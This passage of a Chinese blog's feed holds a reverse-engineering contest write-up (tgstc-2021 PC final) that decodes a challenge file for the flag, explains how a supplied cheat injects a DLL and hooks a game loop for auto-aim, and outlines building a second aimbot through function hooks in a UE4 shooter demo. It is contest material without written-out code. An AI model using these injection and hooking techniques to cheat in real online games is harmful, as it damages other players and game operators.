&lt;p&gt;​	&lt;img src=&quot;/2021/04/18/tgstc-2021-Android-%E5%88%9D%E8%B5%9B/image-20210418104119614.png&quot; class=&quot;&quot; title=&quot;image-20210418104119614&quot;&gt;&lt;/p&gt;
&lt;p&gt;​	能反编译了，但是细看发现里面的东西不对劲，很少，不像真正的游戏代码。&lt;/p&gt;
&lt;p&gt;​	那估计是在mono加载的地方动了手脚，接下来想办法从这里入手。&lt;/p&gt;</summary>
    
    
    
    
    <category term="逆向" scheme="https://ihopenot.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>tgstc-2021-PC-复赛</title>
    <link href="https://ihopenot.github.io/2021/04/17/tgstc-2021-PC-%E5%A4%8D%E8%B5%9B/"/>
    <id>https://ihopenot.github.io/2021/04/17/tgstc-2021-PC-%E5%A4%8D%E8%B5%9B/</id>
    <published>2021-04-17T10:17:45.000Z</published>
    <updated>2023-08-24T14:58:54.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>​flag很简单，程序从hack.dat中读取内容解密。</p><p>​要求解密后对应位置拼起来是ShooterClient.exe。</p><p>​解密方法就是简单的异或解密。</p><p>​做到这里hack.exe已经可以工作了，进一步的，程序将解密出来的字符串和2RSRhrofoWtLeLrJCSlTireznrtx.oeLxuehyyAwbpCOZq0tsS7MZyVdOUoE8比较。</p><p>​求解过程：</p><img src="/2021/04/17/tgstc-2021-PC-%E5%A4%8D%E8%B5%9B/image-20210417201634008.png" class="" title="image-20210417201634008"><p>​其中 t 就是hack.dat中应有的数据。写入之后运行就得到了flag</p><p>flag:2RSRhrofoWtLeLrJCSlTireznrtx.oeLxuehyyAwbpCOZq0tsS7MZyVdOUoE8</p><p>​之后要求分析hack.exe的实现方法。</p><span id="more"></span><p>​跟了一下发现hack.exe中实现了一个PEloader，将内存中的一份dll，暂且命名为hack.dll写入了目标进程并且跳转到EP执行。</p><p>​dump出来hack.dll分析，关键部分是钩了一个类似tick函数的东西，每次暴力从world中取出actor列表，之后匹配字符串来判断是不是角色actor。</p><img src="/2021/04/17/tgstc-2021-PC-%E5%A4%8D%E8%B5%9B/image-20210417202151693.png" class="" title="image-20210417202151693"><p>​然后每次函数调用时会检测右键是否按下，如果按下，就寻找一定视角范围内的角色actor，将视角直接写过去。</p><img src="/2021/04/17/tgstc-2021-PC-%E5%A4%8D%E8%B5%9B/image-20210417202334871.png" class="" title="image-20210417202334871"><p>​hack.dll分析就差不多了。</p><p>​回过头看游戏程序本身，是ue4写的，而且就是ue4的一个射击游戏demo，这很好，立刻下载源码。</p><p>​既然题目要求说了不能用相同的方法实现，那么就不从world结构体去枚举actor获取敌人坐标，而是维护一个存活列表，列表中的元素由构造函数添加，并且由onDeath函数删除。然后钩取Camera的update函数，在每次刷新时检测是否处于targeting的状态，如果存在就自瞄，自瞄的逻辑和hack.exe中是相同的。</p><p>​具体钩取函数如下：</p><p>（构造函数）</p><img src="/2021/04/17/tgstc-2021-PC-%E5%A4%8D%E8%B5%9B/image-20210417202926945.png" class="" title="image-20210417202926945"><p>（onDeath函数）</p><img src="/2021/04/17/tgstc-2021-PC-%E5%A4%8D%E8%B5%9B/image-20210417203051066.png" class="" title="image-20210417203051066"><p>（updateCamera）</p><img src="/2021/04/17/tgstc-2021-PC-%E5%A4%8D%E8%B5%9B/image-20210417203145996.png" class="" title="image-20210417203145996"><p>​具体函数如何找到偏移就根据字符串信息和ce中寻找的地址交叉引用寻找。</p><p>​注意的是退出到主界面是要把列表清空。</p><p>​总的来说实现有点复杂了。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;​	flag很简单，程序从hack.dat中读取内容解密。&lt;/p&gt;
&lt;p&gt;​	要求解密后对应位置拼起来是ShooterClient.exe。&lt;/p&gt;
&lt;p&gt;​	解密方法就是简单的异或解密。&lt;/p&gt;
&lt;p&gt;​	做到这里hack.exe已经可以工作了，进一步的，程序将解密出来的字符串和2RSRhrofoWtLeLrJCSlTireznrtx.oeLxuehyyAwbpCOZq0tsS7MZyVdOUoE8比较。&lt;/p&gt;
&lt;p&gt;​	求解过程：&lt;/p&gt;
&lt;img src=&quot;/2021/04/17/tgstc-2021-PC-%E5%A4%8D%E8%B5%9B/image-20210417201634008.png&quot; class=&quot;&quot; title=&quot;image-20210417201634008&quot;&gt;

&lt;p&gt;​	其中 t 就是hack.dat中应有的数据。写入之后运行就得到了flag&lt;/p&gt;
&lt;p&gt;flag:2RSRhrofoWtLeLrJCSlTireznrtx.oeLxuehyyAwbpCOZq0tsS7MZyVdOUoE8&lt;/p&gt;
&lt;p&gt;​	之后要求分析hack.exe的实现方法。&lt;/p&gt;</summary>
    
    
    
    
    <category term="逆向" scheme="https://ihopenot.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
